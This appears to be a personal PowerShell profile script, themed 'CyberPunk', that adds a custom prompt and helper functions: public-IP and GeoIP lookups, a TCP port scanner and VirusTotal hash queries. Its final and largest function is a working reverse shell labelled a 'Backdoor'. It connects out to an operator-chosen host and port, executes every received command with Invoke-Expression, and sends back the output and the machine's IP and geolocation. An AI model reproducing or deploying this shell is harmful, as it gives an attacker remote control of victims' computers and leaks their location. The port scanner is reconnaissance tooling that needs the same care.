#Author Unam3dd
# Install-Module -Name "PSWriteColor"
$Host.UI.RawUI.WindowTitle = "Powershell@Unam3dd"
$Host.ui.rawui.backgroundcolor = "Black"
$Host.ui.rawui.foregroundcolor = "Magenta"
cls

$banner = "
_______ __   __ ______  _______  ______  _____  _     _ __   _ _     _
|         \_/   |_____] |______ |_____/ |_____] |     | | \  | |____/ 
|_____     |    |_____] |______ |    \_ |       |_____| |  \_| |    \_
                                                                      

                Github : https://github.com/Unam3dd
                Youtube : Unam3dd 
                Version : 1.0     

"

Write-Host $banner -ForegroundColor Cyan

function Prompt{
    $s = [regex]::Unescape("\u039B").ToString()
    $ss = [regex]::Unescape("\u003E").ToString()
    $d = get-date -Format "HH:mm:ss"
    Write-Host ("[") -NoNewline
    Write-Host ($Env:USERNAME) -NoNewline -ForegroundColor cyan
    Write-Host ("@") -NoNewline
    Write-Host ($ENV:COMPUTERNAME) -NoNewline -ForegroundColor cyan
    Write-Host ("]") -NoNewline
    Write-Host (" ~ ") -NoNewline -ForegroundColor green
    Write-Host("$pwd (") -NoNewline -ForegroundColor cyan
    Write-Host("$d") -NoNewline -ForegroundColor green
    Write-Host(")") -NoNewline -ForegroundColor cyan
    Write-Host("`n$s ") -NoNewline -ForegroundColor cyan
    Write-Host("$ss") -NoNewline
    return " "
}

function Get-MyIp{
    $r = Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing
    Write-Host "[+] Your IP : " $r.Content -ForegroundColor green
}

function TryPort ($hostname,$port,[int32]$timeout) {
    $requestCallback = $state = $null
    $client = New-Object System.Net.Sockets.TcpClient
    $beginConnect = $client.BeginConnect($hostname,$port,$requestCallback,$state)
    Start-Sleep -milli $timeOut
    if ($client.Connected) 
    { 
        $open = $true
    } else { 
        $open = $false
    }
    $client.Close()
    [pscustomobject]@{hostname=$hostname;port=$port;open=$open}
}


function GetSearchVirusTotal($KEY,$HASHFILE){
    $link = "https://www.virustotal.com/vtapi/v2/file/report?apikey=$KEY&resource=$HASHFILE&allinfo=true"
    $r = Invoke-WebRequest -Uri $link -UseBasicParsing
    return $r
}

function SearchVirusTotal($KEY,$HASH,$VERBOSE=$false){
    $link = "https://www.virustotal.com/vtapi/v2/file/report?apikey=$KEY&resource=$HASH&allinfo=true"
    $r = Invoke-WebRequest -Uri $link -UseBasicParsing
    $obj = $r.Content | ConvertFrom-Json
    Write-Color "[","+","] MD5 : ", $obj.md5 -Color Green,Blue,Green,Yellow
    Write-Color "[","+","] SHA1 : ", $obj.sha1 -Color Green,Blue,Green,Yellow
    Write-Color "[","+","] Scan Date : ", $obj.scan_date -Color Green,Blue,Green,Blue
    Write-Color "[","+","] Scan ID : ", $obj.scan_id -Color Green,Blue,Green,Yellow
    Write-Color "[","+","] Score (positives/total): ", $obj.positives,"/",$obj.total -Color Green,Blue,Green,Red,Green,Red
    Write-Color "[","+","] Link : ", $obj.permalink -Color Green,Blue,Green,Yellow
    Write-Host "`n"
    $objname = $obj.scans | Get-Member
    $strarray = @()
    $strarray = $strarray + $objname.Name
    $i = 4
    if ($VERBOSE -eq $true){
        while($i -lt $strarray.Length){
            $av_name = $strarray[$i]
            Write-Color "[","+","] AV Name : ", $strarray[$i] -Color Green,Blue,Green,Cyan
            Write-Color "[","+","] Version : ",$obj.scans.$av_name.version -Color Green,Blue,Green,Yellow
            if ($obj.scans.$av_name.detected -eq $true){
                Write-Color "[","+","] Detected : ",$obj.scans.$av_name.result -Color Green,Blue,Green,Red
            } else {
                Write-Color "[","+","] Detected : ","false" -Color Green,Blue,Green,Blue
            }
            Write-Color "[","+","] Update AV :",$obj.scans.$av_name.update -Color Green,Blue,Green,Yellow
            Write-Host "`n"
            $i =  $i + 1
        }
    } else {
        while($i -lt $strarray.Length){
            $av_name = $strarray[$i]
            if ($obj.scans.$av_name.detected -eq $true){
                Write-Color "[","+","] AV Name : ", $strarray[$i] -Color Green,Blue,Green,Cyan
                Write-Color "[","+","] Version : ",$obj.scans.$av_name.version -Color Green,Blue,Green,Yellow
                Write-Color "[","+","] Detected : ",$obj.scans.$av_name.result -Color Green,Blue,Green,Red
                Write-Color "[","+","] Update AV :",$obj.scans.$av_name.update -Color Green,Blue,Green,Yellow
                Write-Host "`n"
                $i =  $i + 1
            } else {
                $i =  $i + 1
            }
        }
    }
}

function GetServiceByPort($PATH,$PORT){
    $SEL = Select-String -Path $PATH -Pattern $PORT

    if ($SEL -ne $null){
        $splited = $SEL[0] -split ":"
        $s = $splited[3]
        $service = $s.Split("|")[1]
        return $service
    }

    return $null
}

function PortScan($IP,$MAXPORT,[int32]$TIMEOUT){
    Write-Host "[+] PORT    |  STATE   |     SERVICE"
    for ($i=1; $i -le $MAXPORT; $i=$i+1 ) {
        $check = TryPort $IP $i $TIMEOUT
        if ($check.open -eq $true){
            $b = echo $PROFILE
            $bb = $b.Split("\\")[0..4]
            $path = $bb -Join "\"
            $sb = GetServiceByPort $path"\service_port.txt" "$i"
            if ($sb -ne $null){
                Write-Host "[+] "$i"        Open        " $sb -ForegroundColor green
            } else {
                Write-Host "[+] "$i"        Open        Unknown" -ForegroundColor green
            }
        }
    }
}

function HttpGet([String]$URI){
    $r = Invoke-WebRequest -Uri $URI -UseBasicParsing
    return $r
}

function Get-GeoIP{
    $r = Invoke-WebRequest -Uri "http://ipinfo.io/json" -UseBasicParsing
    $content = $r.Content | ConvertFrom-Json
    Write-Host "[+] IP : " $content.ip -ForegroundColor green
    Write-Host "[+] Hostname : " $content.hostname -ForegroundColor green
    Write-Host "[+] City : " $content.city -ForegroundColor green
    Write-Host "[+] Region : " $content.region -ForegroundColor green
    Write-Host "[+] Country : " $content.country -ForegroundColor green
    Write-Host "[+] Loc : " $content.loc -ForegroundColor green
    Write-Host "[+] Org : " $content.org -ForegroundColor green
    Write-Host "[+] Postal : " $content.postal -ForegroundColor green
    Write-Host "[+] Timezone : " $content.timezone -ForegroundColor green
}

function GeoIP($IP){
    $r = Invoke-WebRequest -Uri "http://ipinfo.io/$IP/geo" -UseBasicParsing
    $content = $r.Content | ConvertFrom-Json
    Write-Host "[+] IP : " $content.ip -ForegroundColor green
    Write-Host "[+] City : " $content.city -ForegroundColor green
    Write-Host "[+] Region : " $content.region -ForegroundColor green
    Write-Host "[+] Country : " $content.country -ForegroundColor green
    Write-Host "[+] Loc : " $content.loc -ForegroundColor green
    Write-Host "[+] Postal : " $content.postal -ForegroundColor green
    Write-Host "[+] Timezone : " $content.timezone -ForegroundColor green
}

function ReverseShell {
    param([String]$LHOST,[int]$LPORT)
    $client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

        #strcmp()
        if ($data.startswith("/shell_help")){
            $message = "ipgeo    | Get Geolocation"
            $sendbyte = ([text.encoding]::ASCII).GetBytes($message)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        elseif($data.startswith("exit")){
            $message = "Exit Backdoor !!!"
            $sendbyte = ([text.encoding]::ASCII).GetBytes($message)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            break;
        }
        elseif($data.startswith("ipgeo")){
            $r = Invoke-WebRequest -URI "https://ipinfo.io/json"
            $status = $r.StatusCode
            if($status -eq 200){
                $data_ipgeo = $r.Content
                $sendbyte = ([text.encoding]::ASCII).GetBytes($data_ipgeo)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
                $sendback = (iex $data 2>&1 | Out-String )
                $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
            }
        }

        elseif($data.startswith("getip")){
            $r = Invoke-WebRequest -URI "https://ifconfig.me/ip"
            $status = $r.StatusCode
            if($status -eq 200){
                $target_ip = $r.Content
                $sendbyte = ([text.encoding]::ASCII).GetBytes($target_ip)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
                $sendback = (iex $data 2>&1 | Out-String )
                $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
            }
        }

        elseif($data.startswith("quit")){
            $message = "Exit Backdoor !!!"
            $sendbyte = ([text.encoding]::ASCII).GetBytes($message)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
            break;
        }
        else{
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "Shell" + (pwd).Path + "$ "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
    }
    $client.Close()
}